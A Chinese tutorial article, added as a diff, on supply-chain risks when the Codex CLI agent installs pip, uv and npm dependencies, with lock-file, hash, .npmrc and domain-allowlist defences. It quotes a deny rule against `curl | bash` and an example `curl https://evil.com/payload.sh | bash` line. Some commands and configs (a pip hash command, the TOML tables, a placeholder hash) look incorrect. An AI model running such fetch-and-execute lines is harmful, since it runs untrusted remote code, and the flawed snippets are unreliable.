@@ -1,0 +1,438 @@
+<!--
+调研来源（不发布，仅记录）：
+1. Codex 官方文档: Agent approvals & security — 命令执行与依赖安装
+2. Codex 官方文档: Configuration Reference — shell_environment_policy、sandbox_mode
+3. Python 官方文档: pip security — --require-hashes、--no-deps、虚拟环境
+4. uv 官方文档: Security considerations — 哈希校验、锁定文件
+5. npm 官方文档: npm security — package-lock.json、audit、ci
+6. 本系列第 26 篇: Shell 与沙箱配置 — network_access、writable_roots
+7. 本系列第 33 篇: 网络安全与隔离 — 域名策略、代理配置
+版本基准: 2026 年 6 月
+-->
+
+# Codex CLI 依赖安全：requirements.txt、pip 与 npm 的风险边界
+
+> TL;DR：让 Codex 管理 Python 依赖（`pip install`）或 JavaScript 依赖（`npm install`）看起来方便，但引入了供应链攻击的风险面。Codex 执行 `pip install` 时不会验证包的完整性（除非你显式配置 `--require-hashes`），不会检查已知漏洞，也不会确认包名是否拼写正确。`npm install` 同理——`package-lock.json` 提供了一定保护，但 Codex 可能删除它后重新安装。防护措施包括：锁定文件、哈希校验、域名白名单、沙箱网络隔离、虚拟环境隔离。本文从"依赖安装的安全模型"讲起，覆盖 pip/npm 的安全机制、Codex 执行依赖安装的行为模式、`requirements.txt` 与 `uv.lock` 的区别、审计命令配置，以及两个实战场景。
+
+---
+
+## 1. 依赖安装的安全模型
+
+软件供应链攻击在过去几年里增长迅速。攻击者通过在 npm、PyPI、crates.io 等包管理器的注册表上发布恶意包来感染下游项目。手法包括：
+
+- **名字混淆**：发布一个和热门包名字相似但拼写不同的包（`reqeusts` vs `requests`），依赖开发者打错字
+- **版本劫持**：在已有包名下抢注已被删除的版本号，当项目锁定文件缺失时被安装
+- **恶意后门**：在看似正常的包中植入数据窃取、远程代码执行等恶意代码
+- **依赖链感染**：通过污染一个被广泛依赖的基础包来影响大量下游项目
+
+这些攻击的共同点是：它们利用了"开发者信任包管理器"这个假设。当你执行 `pip install` 或 `npm install` 时，你通常不会检查每个包的源码——你信任注册表的包名、版本号和发布者信息。AI 编程代理也会做同样的事，而且更容易中招，因为它不知道哪些包是"知名可信的"，哪些是"可疑的"。
+
+Codex 在执行依赖安装时的行为模式：
+
+1. 它会根据你描述的任务判断需要安装哪些依赖
+2. 它会执行 `pip install` 或 `npm install` 命令
+3. 它不会验证包的完整性、不会检查已知漏洞、不会确认包名拼写
+4. 安装完成后继续执行后续任务
+
+第 3 点是关键——Codex 在依赖安全方面没有任何"额外判断"。它执行 `pip install requests` 和你手动在终端里执行的效果一样，只是没有你的直觉过滤。
+
+---
+
+## 2. Python 依赖安全
+
+### 2.1 pip install 的风险面
+
+`pip install` 是最常见的 Python 依赖安装命令。它的默认行为有几个安全隐患：
+
+- **不验证包哈希**：默认情况下 `pip install` 不检查下载包的哈希值。如果注册表被篡改或中间人攻击发生，恶意包会被安装到你的环境中
+- **安装所有依赖**：默认安装 `requirements.txt` 中列出的所有包及其传递依赖。如果某个传递依赖被污染，你的环境也会被感染
+- **写入全局或用户环境**：如果不使用虚拟环境，包会安装到系统 Python 的 `site-packages`，影响所有使用这个 Python 的项目
+- **执行 setup.py**：某些旧式包在安装时会执行 `setup.py`，其中可能包含任意代码
+
+### 2.2 --require-hashes 哈希校验
+
+```bash
+pip install --require-hashes -r requirements.txt
+```
+
+`--require-hashes` 是 pip 提供的安全选项。启用后，`requirements.txt` 必须包含每个包的哈希值：
+
+```
+requests==2.32.3 \
+    --hash=sha256:dd968c53397f3824a8e8148d0e21a81e8bc9f1b1a5be1c66bc4eb22a4f27e4b2
+urllib3==2.3.0 \
+    --hash=sha256:ce4f7a7c0b2e9c3c5f2e1c2f3e4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4
+```
+
+如果下载的包的哈希值和 `requirements.txt` 中不匹配，pip 拒绝安装。这可以有效防止：
+- 注册表被篡改后的包替换
+- 中间人攻击
+- 传输过程中文件损坏
+
+生成带哈希的 requirements.txt：
+
+```bash
+pip install --hash=sha256 requests
+```
+
+或者用 `pip-compile`（来自 `pip-tools`）自动生成：
+
+```bash
+pip-compile --generate-hashes requirements.in
+```
+
+### 2.3 requirements.txt 生成方式
+
+`requirements.txt` 的生成方式直接影响安全性：
+
+| 方式 | 安全性 | 可重复性 | 说明 |
+|---|---|---|---|
+| `pip freeze > requirements.txt` | 中 | 低 | 包含所有已安装包，可能有不需要的依赖 |
+| `pip-compile requirements.in` | 高 | 高 | 只包含直接依赖，自动解析传递依赖 |
+| 手动编写 | 取决于人 | 取决于人 | 最灵活，但容易遗漏或版本不精确 |
+
+推荐使用 `pip-compile`（来自 `pip-tools` 包）或 `uv pip compile`。这两种方式生成的 `requirements.txt` 包含精确版本号和所有传递依赖，可以搭配 `--require-hashes` 使用。
+
+### 2.4 uv 的安全优势
+
+`uv` 是 Rust 实现的 Python 包管理器，兼容 pip 但速度更快，安全方面也有一些改进：
+
+```bash
+# 用 uv 安装依赖（替代 pip）
+uv pip install -r requirements.txt
+
+# 用 uv 生成锁定文件
+uv lock
+
+# 用 uv 安装（使用锁定文件中的精确版本和哈希）
+uv sync
+```
+
+`uv.lock` 文件包含了所有依赖的精确版本、源码哈希、Git 依赖的 commit hash。`uv sync` 安装时会校验这些哈希值，不需要额外配置 `--require-hashes`。
+
+在 Codex 环境中用 `uv` 替代 `pip` 的好处：
+- 安装速度更快（Codex 的命令执行时间更短）
+- 锁定文件内置哈希校验
+- 不需要手动配置 `--require-hashes`
+
+### 2.5 虚拟环境隔离
+
+Codex 执行 `pip install` 时，如果没有激活虚拟环境，包会安装到系统 Python 环境。
+
+```bash
+# 在 Codex 执行前确保虚拟环境已激活
+codex "安装项目依赖并运行测试"
+
+# Codex 可能执行：
+# pip install -r requirements.txt
+# pytest
+```
+
+如果 Codex 直接执行 `pip install` 而没有激活虚拟环境，建议在 `AGENTS.md` 中写明：
+
+```markdown
+## 依赖管理
+- 安装依赖前先激活虚拟环境：source .venv/bin/activate
+- 使用 uv 而不是 pip：uv pip install -r requirements.txt
+- 不要使用 --user 标志
+```
+
+Codex 会读取 `AGENTS.md` 作为项目指令，遵守这些规则。
+
+---
+
+## 3. JavaScript 依赖安全
+
+### 3.1 npm install 的风险面
+
+`npm install` 的安全模型和 pip 类似，有几个额外的问题：
+
+- **`package-lock.json` 可能被 Codex 删除**：Codex 在"清理项目"或"重新安装依赖"时可能删除 `package-lock.json`，导致安装的版本和预期不同
+- **postinstall 脚本**：npm 包的 `postinstall` 钩子在安装时自动执行，可能包含任意命令
+- **幽灵依赖**：Node.js 的 `node_modules` 扁平化结构可能导致"幽灵依赖"——你的代码 import 了一个没有在 `package.json` 中声明的包（因为它被其他包传递依赖了）
+
+### 3.2 package-lock.json 的作用
+
+`package-lock.json` 锁定了所有直接和传递依赖的精确版本。有了它，`npm install` 总是安装相同的版本树。
+
+Codex 在执行依赖安装时的注意事项：
+- 如果 `package-lock.json` 存在，`npm install` 使用锁定文件中的版本，相对安全
+- 如果 Codex 删除了 `package-lock.json` 然后执行 `npm install`，版本解析可能产生不同的结果
+- `npm ci` 比 `npm install` 更安全——它严格按 `package-lock.json` 安装，如果文件不存在或版本不匹配就报错
+
+在 `AGENTS.md` 中约定：
+
+```markdown
+## 依赖管理
+- 使用 npm ci 安装依赖，不要用 npm install
+- 不要删除 package-lock.json
+- 如果需要添加新依赖，使用 npm install <package> --save，然后提交更新后的 package-lock.json
+```
+
+### 3.3 npm audit
+
+```bash
+npm audit
+npm audit fix
+```
+
+`npm audit` 检查项目中已安装的包是否有已知漏洞。Codex 不会自动运行这个命令——你需要主动要求或者在 AGENTS.md 中配置：
+
+```markdown
+## 依赖管理
+- 安装依赖后运行 npm audit 检查已知漏洞
+- 如果发现高危漏洞，使用 npm audit fix 修复
+- 不要忽略 audit 报告中的 critical 和 high 级别漏洞
+```
+
+### 3.4 .npmrc 安全配置
+
+项目根目录的 `.npmrc` 文件可以配置 npm 的行为：
+
+```ini
+# .npmrc
+# 禁止 postinstall 脚本执行
+ignore-scripts=true
+
+# 使用官方注册表
+registry=https://registry.npmjs.org/
+
+# 禁止自动更新
+save-exact=true
+```
+
+`ignore-scripts=true` 阻止 npm 包的 `preinstall`、`install`、`postinstall` 脚本执行。这是防止供应链攻击的有效措施，但也会导致一些依赖无法正常安装（因为它们的安装流程依赖 postinstall 脚本）。
+
+---
+
+## 4. Codex 执行依赖安装的行为
+
+### 4.1 触发场景
+
+Codex 在以下场景中会执行依赖安装命令：
+
+- **你明确要求**："安装 Flask 和 SQLAlchemy"
+- **代码分析发现缺失依赖**：Codex 读代码发现 import 了某个未安装的包
+- **任务执行过程中**：比如"帮我搭建一个 FastAPI 项目"，Codex 在创建项目文件后会安装依赖
+- **测试失败后**：运行测试时报 `ModuleNotFoundError`，Codex 尝试安装缺失的包
+
+### 4.2 审批流程
+
+依赖安装涉及网络访问（需要从注册表下载包），在 `approval_policy = "on-request"` 模式下会触发审批。
+
+```
+Codex: 我需要安装 requests 和 pytest
+       （审批触发：pip install 需要网络访问）
+
+[审批提示] 执行命令: pip install requests pytest
+> Y
+```
+
+你可以在这个审批点检查 Codex 要安装的包名是否正确。比如 Codex 说要安装 `reqeusts`（拼写错误），你可以拒绝并纠正。
+
+### 4.3 配合 auto_review 的策略
+
+如果你开启了自动审查器，可以在策略中明确控制依赖安装的行为：
+
+```toml
+[auto_review]
+policy = """
+允许运行 pip install 和 uv pip install 命令。
+允许运行 npm ci 命令。
+拒绝运行 npm install 命令（应该用 npm ci）。
+拒绝运行 pip install --user 命令。
+拒绝运行 curl | bash 或 wget -qO- | bash 类型的命令。
+"""
+```
+
+策略的要点：
+- 明确允许 `pip install` 和 `uv pip install`（因为 Codex 经常需要安装依赖）
+- 允许 `npm ci` 而不是 `npm install`（ci 更安全）
+- 禁止 `pip install --user`（避免污染用户级别的 Python 环境）
+- 禁止 `curl | bash` 类型的命令（常见的供应链攻击向量）
+
+---
+
+## 5. 域名层面的防护
+
+### 5.1 限制包管理器域名
+
+如果你开启了沙箱网络访问，用域名白名单限制 Codex 只能访问包管理器：
+
+```toml
+[sandbox_workspace_write]
+network_access = true
+
+[features.network_proxy]
+enabled = true
+domains = {
+  "registry.npmjs.org" = "allow"
+  "registry.yarnpkg.com" = "allow"
+  "pypi.org" = "allow"
+  "files.pythonhosted.org" = "allow"
+  "crates.io" = "allow"
+  "static.crates.io" = "allow"
+  "github.com" = "allow"
+  "raw.githubusercontent.com" = "allow"
+  "*" = "deny"
+}
+```
+
+这样即使 Codex 执行了 `curl https://evil.com/payload.sh | bash`，域名策略也会阻止访问 `evil.com`。
+
+### 5.2 私有注册表
+
+企业环境通常有私有的包管理器注册表：
+
+```toml
+[features.network_proxy]
+enabled = true
+domains = {
+  "registry.npmjs.org" = "allow"
+  "pypi.org" = "allow"
+  "artifactory.internal.company.com" = "allow"
+  "npm-registry.internal.company.com" = "allow"
+  "*" = "deny"
+}
+```
+
+同时配置 pip 和 npm 使用私有注册表：
+
+```bash
+# pip 使用私有源
+pip install --index-url https://artifactory.internal.company.com/pypi/simple/
+
+# npm 使用私有源
+npm config set registry https://npm-registry.internal.company.com/
+```
+
+私有注册表的安全优势：企业可以控制哪些包可以安装、扫描已知漏洞、拦截恶意包。代价是维护成本和可能的版本滞后。
+
+---
+
+## 6. 实战场景
+
+### 场景一：Python 项目的安全依赖安装
+
+项目使用 `uv` 作为包管理器，有 `uv.lock` 锁定文件。
+
+```toml
+# ~/.codex/config.toml
+sandbox_mode = "workspace-write"
+
+[sandbox_workspace_write]
+network_access = true
+writable_roots = ["/tmp"]
+
+[features.network_proxy]
+enabled = true
+domains = {
+  "pypi.org" = "allow"
+  "files.pythonhosted.org" = "allow"
+  "github.com" = "allow"
+  "*" = "deny"
+}
+```
+
+`AGENTS.md` 中的约定：
+
+```markdown
+## 依赖管理
+- 使用 uv 而不是 pip 管理依赖
+- 安装依赖用 `uv sync`（基于 uv.lock），不要用 `uv pip install <package>`
+- 如果需要添加新依赖，运行 `uv add <package>` 然后提交更新后的 uv.lock
+- 不要修改 uv.lock 文件的内容
+```
+
+效果：
+- Codex 只能从 PyPI 安装包（域名白名单限制）
+- 安装基于锁定文件，版本和哈希已确定
+- 新依赖通过 `uv add` 添加，自动更新锁定文件
+
+### 场景二：前端项目的安全依赖安装
+
+项目使用 npm，有 `package-lock.json`。
+
+```toml
+# ~/.codex/config.toml
+sandbox_mode = "workspace-write"
+
+[sandbox_workspace_write]
+network_access = true
+
+[features.network_proxy]
+enabled = true
+domains = {
+  "registry.npmjs.org" = "allow"
+  "github.com" = "allow"
+  "*" = "deny"
+}
+```
+
+`AGENTS.md` 中的约定：
+
+```markdown
+## 依赖管理
+- 安装依赖使用 `npm ci`，不要用 `npm install`
+- 不要删除 package-lock.json
+- 安装新依赖使用 `npm install <package> --save`，然后提交更新后的 package-lock.json
+- 安装依赖后运行 `npm audit` 检查已知漏洞
+- 不要安装名字可疑的包（如果不确定，先问我）
+```
+
+`.npmrc` 配置：
+
+```ini
+ignore-scripts=true
+save-exact=true
+```
+
+效果：
+- Codex 从 npm registry 安装包（域名白名单限制）
+- `npm ci` 严格按锁定文件安装
+- postinstall 脚本被禁用
+- `npm audit` 在安装后检查漏洞
+- `save-exact=true` 确保新依赖安装精确版本
+
+---
+
+## 7. 常见问题
+
+### Codex 安装了不需要的包怎么办
+
+`git diff` 检查 `requirements.txt`、`package.json`、`package-lock.json` 的变更。如果 Codex 安装了你不需要的包，从依赖列表中移除，然后 `pip uninstall` 或 `npm uninstall`。
+
+### Codex 删除了 package-lock.json 怎么办
+
+从 Git 历史中恢复：`git checkout package-lock.json`。然后在 `AGENTS.md` 中明确写"不要删除 package-lock.json"。
+
+### uv 和 pip 能混用吗
+
+技术上可以，但不建议。混用可能导致依赖版本冲突和锁定文件不一致。在 `AGENTS.md` 中约定只用其中一个。
+
+### 如何确认安装的包没有恶意代码
+
+`pip audit`（Python）和 `npm audit`（JavaScript）可以检查已知漏洞。对于未知的恶意代码，只能通过代码审查来发现——阅读包的源码或查看社区报告。
+
+---
+
+## 8. 下一步
+
+本篇覆盖了 Codex CLI 依赖安全的完整视角。从软件供应链攻击的风险面，到 pip/npm 的安全机制（哈希校验、锁定文件、postinstall 脚本），到 Codex 执行依赖安装的行为模式，再到域名白名单、私有注册表、AGENTS.md 约定等防护措施。
+
+**下一篇（第 35 篇）**将总结整个安全篇的最佳实践清单——从账号安全到沙箱配置，从审批策略到依赖管理，从网络安全到企业合规，一份可以直接使用的 Codex 安全检查清单。
+
+---
+
+**延伸阅读**
+
+- [Python pip 文档 - Requirements Files](https://pip.pypa.io/en/stable/reference/requirements-file-format/) — requirements.txt 格式和哈希校验
+- [uv 官方文档 - Security](https://docs.astral.sh/uv/pip/security/) — uv 的安全特性
+- [npm 官方文档 - npm audit](https://docs.npmjs.com/cli/v10/commands/audit) — npm 漏洞扫描
+- [OpenSSF Package Manager Security Best Practices](https://openssf.org/resources/) — 包管理器安全最佳实践
+- 本系列第 26 篇 [Shell 与沙箱配置](./26-shell-and-sandbox-config.md) — 沙箱网络控制
+- 本系列第 33 篇 [网络安全与隔离](./33-network-security.md) — 域名策略和代理配置
+
+---
+
+*本文基于 Codex CLI 源码、pip/uv/npm 官方文档和 2026 年 6 月的安全实践撰写。供应链安全是一个持续演进的领域，建议定期检查相关工具和策略的更新。*
